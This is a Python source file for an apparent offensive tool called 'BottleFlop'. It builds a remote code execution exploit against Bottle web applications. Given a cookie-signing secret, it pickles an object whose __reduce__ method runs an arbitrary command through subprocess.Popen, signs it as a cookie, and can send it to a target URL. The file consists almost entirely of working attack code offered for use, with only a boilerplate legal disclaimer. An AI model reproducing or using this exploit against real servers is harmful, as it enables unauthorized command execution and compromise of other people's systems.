from bottle import response
from termcolor import colored
import argparse
import requests
banner = """
                  {}
                  ||
  ___    ___      )(
  \ /    \ /     |__|
   Y      Y      |  |    EJM 96
  _|_    _|_     |__|


------------------------------------------------
    BottleFlop @Numb3rsProprety
"""

parser = argparse.ArgumentParser()
parser.add_argument('--secret', type=str, required=True, help='The secret used to sign cookies')
parser.add_argument('--command', type=str, required=True, help="The command you want to execute. Put quotes around it when there are spaces.")
parser.add_argument('--url', type=str, required=False, help='The endpoint where you need to send the exploit. (reverse shell needed)')
parser.add_argument('--cookiename', type=str, required=False, help="The name of the cookie that is required by the site.")
args = parser.parse_args()

if args.cookiename and (args.url is None):
    parser.error("--cookiename requires --url")
if args.url and (args.cookiename is None):
    parser.error("--url requires --cookiename")

def sendExploit(url, name,cookie):
    cookie_to_send = {name:cookie}
    sent = requests.get(url, cookies=cookie_to_send)
    return sent


def generate(secret_arg, command):
    command = command.split()
    class RCE(object):
        def __reduce__(self):
            import subprocess
            return (subprocess.Popen, (command,))

    response.set_cookie("name", RCE(), secret=secret_arg)
    payload = str(response)
    payload = payload.replace("Content-Type: text/html; charset=UTF-8\nSet-Cookie: name=", '')
    payload = payload.strip()
    return payload



print(colored(banner+"\n",'red'))
print(colored('[!] legal disclaimer: Usage of Bottleflop for attacking targets without prior mutual consent is illegal. It is the end user\'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program', 'yellow'))

if args.url is None and args.cookiename is None:
    payload = generate(args.secret, args.command)
    print("[+] Payload created: %s" % payload)
else:
    payload = generate(args.secret, args.command)
    print("\n[+] Payload created: %s" % payload)
    try:
        yo = sendExploit(args.url,args.cookiename,payload)
    except:
        print("[+] Something bad happenend :(")
        exit(1)    
    print("[+] Payload sent!")
    print("[+] Received status code %i" % yo.status_code)



